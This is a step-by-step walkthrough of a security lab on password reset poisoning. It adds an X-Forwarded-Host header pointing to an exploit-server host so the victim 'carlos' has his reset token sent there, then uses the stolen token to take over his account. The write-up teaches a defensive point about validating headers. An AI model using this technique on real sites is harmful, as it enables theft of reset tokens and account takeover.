# Password Reset Poisoning via Middleware

This lab demonstrates a vulnerability in the password reset flow, where the `X-Forwarded-Host` header is blindly trusted by middleware, allowing us to hijack the reset token.

### 🛠 Step-by-step:

1. **Start BurpSuite** and keep it running.

2. Go to the lab page and click on **"Forgot your password?"**

3. Enter this username:  
wiener

Submit it.

4. In **BurpSuite → HTTP history**, find the `POST /forgot-password` request.

5. **Send it to Repeater.**

6. In the Repeater tab:
- Go to the **Headers** section.
- Add the following header:
  ```
  X-Forwarded-Host: exploit-0a19006d04484df280664eab01a200ce.exploit-server.net
  ```
- Go to the **Body** and change:
  ```
  username=wiener
  ```
  to:
  ```
  username=carlos
  ```

7. **Send the request.**

### 📜 Steal Carlos’s Token

8. Now go to your **Exploit Server → Access logs**.

9. You'll see something like this:
GET /forgot-password?temp-forgot-password-token=czerix0e9qq8xgqlywd68r073nhcy23u

10. Copy the **`temp-forgot-password-token`** value:  
 ```
 czerix0e9qq8xgqlywd68r073nhcy23u
 ```

### 🔗 Modify Reset Link

11. Open the **Email Client**.

12. Copy the **original reset link** at the bottom. Example:
 ```
 https://exploit-server.net/forgot-password?temp-forgot-password-token=abc123xyz
 ```

13. Replace the token in the URL with Carlos’s token:
 ```
 https://exploit-server.net/forgot-password?temp-forgot-password-token=czerix0e9qq8xgqlywd68r073nhcy23u
 ```

14. Paste the **modified link** in a new browser tab.

### ✅ Reset Carlos’s Password

15. Enter a new password for Carlos (example: `khan`) and submit.

16. Now go to the login page and enter:
- **Username**: `carlos`  
- **Password**: `khan`

🎉 **Lab Solved!**

### 🧠 Key Takeaway:

This lab teaches how trusting unvalidated headers like `X-Forwarded-Host` can lead to **reset token theft**, enabling full **account takeover**. Always sanitize and validate headers in middleware to prevent such attacks.
